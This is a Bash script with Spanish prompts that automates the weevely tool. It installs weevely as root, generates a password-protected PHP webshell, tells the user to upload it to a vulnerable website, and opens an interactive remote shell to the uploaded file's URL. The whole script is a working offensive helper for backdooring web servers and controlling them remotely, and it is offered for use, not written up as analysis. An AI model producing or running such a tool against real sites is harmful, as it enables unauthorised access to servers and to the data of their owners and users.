#!/bin/bash

declare -r greenColour="\e[0;32m\033[1m"
declare -r endColour="\033[0m\e[0m"
declare -r redColour="\e[0;31m\033[1m"
declare -r blueColour="\e[0;34m\033[1m"
declare -r yellowColour="\e[0;33m\033[1m"
declare -r purpleColour="\e[0;35m\033[1m"
declare -r turquoiseColour="\e[0;36m\033[1m"
declare -r grayColour="\e[0;37m\033[1m"

which weevely 1>/dev/null
var1=$(echo $?)
which rlwrap 1>/dev/null
var2=$(echo $?)
whoami=$(whoami)

trap ctrl_c INT

function ctrl_c (){
	echo -e "\n\n${redColour}[!] ${endColour}¡Cerrando el programa..!\n"
	sleep 1
	exit 1
}

function Pregunta(){
	echo -e "${blueColour}|-------------------------------------------------------------------|${endColour}"
	echo -e "${blueColour}|${endColour}                  BIENVENIDO A NUESTRO PROGRAMA                    ${blueColour}|${endColour}"
	echo -e "${blueColour}|${endColour}								    ${blueColour}|${endColour}"
	echo -e "${blueColour}|${endColour}            Con este programa podrás crear una webshell            ${blueColour}|${endColour}"
	echo -e "${blueColour}|${endColour}                 y subirla al sitio web vulnerable                 ${blueColour}|${endColour}"
	echo -e "${blueColour}|${endColour}                   ${blueColour}[+]${endColour} Autor: Joaquin Pochat                       ${blueColour}|${endColour}"
	echo -e "${blueColour}|${endColour}								    ${blueColour}|${endColour}"
	echo -e "${blueColour}|-------------------------------------------------------------------|${endColour}"

	echo -e "\nSr. ${greenColour}$whoami${endColour}, tiene dos opciones para ejecutar el programa: \n\n"
	echo -e "1) ${redColour}CREAR ${endColour}una shell\n"
	echo -e "2) ${redColour}EJECUTAR ${endColour}una shell\n"
	read -p "Cual desea elegir?: " respuesta
	echo ""
	if [ $respuesta == "1" ]; then
		Creacion
	fi
        if [ $respuesta == "2" ]; then
		Ejecucion
	fi

}

function Ejecucion(){
	echo -ne "${turquoiseColour}[V] ${endColour}"
	read -p "Indiquenos su URL shell (EXAMPLE: http://x.x.x.x/uploads/r_shell.php): " url 
	echo -ne "${turquoiseColour}[V] ${endColour}"
	read -p "Cual es su contraseña? (EXAMPLE: password): " password
	rlwrap weevely $url $password
}

function Creacion(){
	echo -ne "${turquoiseColour}[V] ${endColour}"
	read -p "Como quieres llamar a tu shell? (EXAMPLE: r_shell): " name_shell
	echo -ne "\n${turquoiseColour}[V] ${endColour}"
        read -p "Donde la quieres guardar? (EXAMPLE: /$whoami/): " name_dir
	echo -ne "\n${turquoiseColour}[V] ${endColour}"
        read -p "Que contraseña quieres ponerle? (EXAMPLE: password): " name_pass
        weevely generate $name_pass $name_dir'/'$name_shell'.php' > /dev/null 2>&1
        echo -e "\n${greenColour}[V] ${endColour}Listo! Su shell se ha creado correctamente con el nombre: ${greenColour}$name_shell.php${endColour}"
	echo -e "\n${redColour}[!] ${endColour} ADVERTENCIA: Debe subir su shell para poder establecer una conexión."
	echo -ne "\n${turquoiseColour}[V] ${endColour}"
        read -p "Desea ejecutar su shell? (S/n): " respuesta2
	if [ $respuesta2 == "S" ]; then
		echo -ne "${turquoiseColour}[V] ${endColour}"
        	read -p "Indiquenos su URL shell (EXAMPLE: http://x.x.x.x/uploads/r_shell.php): " url 
        	rlwrap weevely $url $name_pass
	fi

	if [ $respuesta2 == "n" ]; then
		echo -e "\n${turquoiseColour}[*] ${endColour}Gracias por usar nuestro programa!\n"
		sleep 2
		echo -e "${turquioiseColour}[*] ${endColour}Cerrando...\n"
		sleep 3
	fi
}

if [ $(id -u $whoami) -eq "0" ]; then

	if [ $var1 -ne 0 ] ; then
		echo -e "\n${redColour}[X] ${endColour}No tiene instalado: ${yellowColour}Weevely${endColour}\n${purpleColour}${greenColour}[*] ${endColour}Procediendo a la instalación..${endColour}\n"
		if [ $var2 -ne 0 ] ; then
		echo -e "\n${redColour}[X] ${endColour}No tiene instalado: ${yellowColour}rlwrap${endColour}\n${purpleColour}${greenColour}[*] ${endColour}Procediendo a la instalación..${endColour}\n"
		echo -e "\n${turquoiseColour}[*] Instalando...${endColour}"
		apt install weevely -y > /dev/null 2>&1
		apt install rlwrap -y > /dev/null 2>&1
		echo -e "\n${greenColour}[V] ${endColour}Listo!\n"
		Pregunta
		fi
	else
		Pregunta
	fi
else
	echo -e "\n${redColour}[X] ${endColour}Necesitas ser root o ejecutar con SUDO!\n"
fi
